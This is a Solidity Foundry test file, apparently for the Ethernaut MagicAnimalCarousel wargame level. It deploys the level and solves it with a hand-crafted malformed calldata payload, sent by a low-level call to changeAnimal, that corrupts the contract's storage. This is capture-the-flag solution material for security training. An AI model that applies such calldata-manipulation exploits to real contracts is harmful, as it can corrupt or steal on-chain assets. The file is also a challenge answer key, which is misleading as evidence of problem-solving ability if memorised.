pragma solidity ^0.8.0;

import "src/levels/MagicAnimalCarousel/MagicAnimalCarouselFactory.sol";
import "src/levels/MagicAnimalCarousel/MagicAnimalCarousel.sol";
import "forge-std/Test.sol";

contract MagicAnimalCarouselAttackTest is Test {
    address public dummyPlayerAddress = 0x30d2554d48037F642f095F24098319481A6D6642;
    MagicAnimalCarouselFactory public factory;
    MagicAnimalCarousel public instance;

    function setUp() public {
        factory = new MagicAnimalCarouselFactory();
        instance = MagicAnimalCarousel(payable(factory.createInstance(dummyPlayerAddress)));
    }

    function test_ShouldNotBeImmediatelySolvable() public {
        assertEq(factory.validateInstance(payable(address(instance)), dummyPlayerAddress), false);
    }

    function test_ShouldAllowThePlayerToSolveTheLevel() public {
        vm.startPrank(dummyPlayerAddress, dummyPlayerAddress);
        instance.setAnimalAndSpin("Echidna");
        bytes memory payload = abi.encodePacked(uint256(64), uint256(1), uint256(12), hex"31323334353637383930ffff");
        (bool success, ) = address(instance).call(abi.encodePacked(instance.changeAnimal.selector, payload));
        assertTrue(success);
        instance.setAnimalAndSpin("Pidgeon");
        assertEq(factory.validateInstance(payable(address(instance)), dummyPlayerAddress), true);
    }
}
